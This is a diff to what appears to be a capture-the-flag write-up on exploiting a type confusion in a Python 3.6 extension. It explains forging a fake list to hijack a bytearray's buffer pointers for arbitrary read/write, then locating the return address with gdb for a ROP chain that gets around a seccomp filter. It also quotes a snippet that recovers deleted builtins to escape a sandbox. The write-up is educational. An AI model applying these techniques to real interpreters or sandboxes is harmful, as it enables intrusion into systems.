@@ -334,21 +334,94 @@ Now we need some feng shui to gain arbitrary read/write. We will use `bytes`, `b
 The `bytes` type is very similar to `string` type:
 
 ```c
-struct PyBytes {
+struct PyBytesObject {
     size_t ref_cnt;
     PyObject *type;
-    size_t len;
-    long hash;
-    char ob_val[];
+    Py_ssize_t len;
+    long hash; /* usually -1 */
+    char ob_val[]; /* bytes are stored just after hash field */
 };
 
-struct PyBArr {
+struct PyByteArrayObject {
     size_t ref_cnt;
     PyObject *type;
-    size_t len;
-    size_t ob_alloc;
-    char *ob_bytes;    
-    char *ob_start;    
+    Py_ssize_t len;
+    Py_ssize_t ob_alloc; /* how many bytes are allocated in ob_bytes. */
+    char *ob_bytes; /* physical buffer start. */   
+    char *ob_start; /* logical buffer start. */
 }
 ```
 
+We want to write over memory of our choice. Look at PyByteArrayObject. If we could control `ob_bytes` and `ob_start` fields we could just set them to the desired address and then read/write would read/write from/to this address!
+
+Ok, so we know our goal. We have bytearray `read_write_barr` and we want to find a way to modify these `ob_bytes`, `ob_start` fields. 
+If Collection.Collection construction would allow a ByteArray type then it would be trivial as type confusion let's us create fake object in memory (treat raw long as PyObject). But unfortunetely we can only play with dictionaries and lists. I choose list for simplicity.
+
+So we create a `fake_list` in memory. We set its `items` fields to point to bytearray `barr` and using type confusion we set `barr->ob_bytes`, `barr->ob_start` fields to `read_write_barr`. It sounds complicated – I know. This is perhaps the hardest part.
+          
+Check [exp.py](exp.py) to see the code for this part.
+
+
+## ROP
+Having arbitrary read, write it is quite easy. Ppython3.6 is not a PIE executable. Note: I am exploiting my local python3, not the one from task, so the gadgets location might differ.
+
+```console
+$ checksec /usr/bin/python3.6
+[*] '/usr/bin/python3.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE
+    FORTIFY:  Enabled
+```
+
+We can create a ROP to read flag content from file descriptor 1023 and then to print flag content to stdout. But we saw before that seccomp filter doesn't allow us to use standard `read`. Instead we need to use `readv`. This is not a problem.
+The more interesting part is how do we find the address of return address to overwrite?
+Well python3.6 has a builtin global variable `environ`. It is a global pointer to dictionary of environment variables on stack. So by using arbitrary read, we can get the address of this dictionary on the stack and then just add a constant offset of `PyMain` return address.
+
+```gdb
+$ gdb --args python3.6 exp.py
+pwndbg> r
+Program received signal SIGUSR1, User defined signal 1.
+
+pwndbg> info addr environ
+Symbol "environ" is static storage at address 0xa509a0.
+pwndbg> x/1gx 0xa509a0
+0xa509a0 <environ>:	0x00007fffffffdfb0
+
+pwndbg> x/500i PyMain
+   0x6390a0 <Py_Main>:	push   r15
+   0x6390a2 <Py_Main+2>:	push   r14
+   [...]
+   0x639455 <Py_Main+949>:	ret
+   [...]
+pwndbg> b *0x639455
+pwndbg> c
+Continuing.
+
+Breakpoint 1, 0x639455 in Py_Main()
+pwndbg> x/1gx $rsp
+0x7fffffffe0f8: 0x00000000004b0f40
+```
+
+So the offset is 0x7fffffffe0f8 - 0x00007fffffffdfb0 = 0x148
+
+## POC
+And this is it. The only problem I've encountered was that I forgot I cannot use bytearray nor bytes type as almost all references to builting have been deleted. But I found a great [writeup](https://xz.aliyun.com/t/3747) which shows a nice bypass trick.
+
+```python3
+# Stolen from https://xz.aliyun.com/t/3747
+subs = [].__class__.mro()[1].__subclasses__()
+for cls in subs:
+    if cls.__name__ == 'bytearray':
+        bytearray = cls
+
+    if cls.__name__ == 'list':
+        list = cls
+
+    if cls.__name__ == 'bytes':
+        bytes = cls
+```
+
+[Full exploit](exp.py)
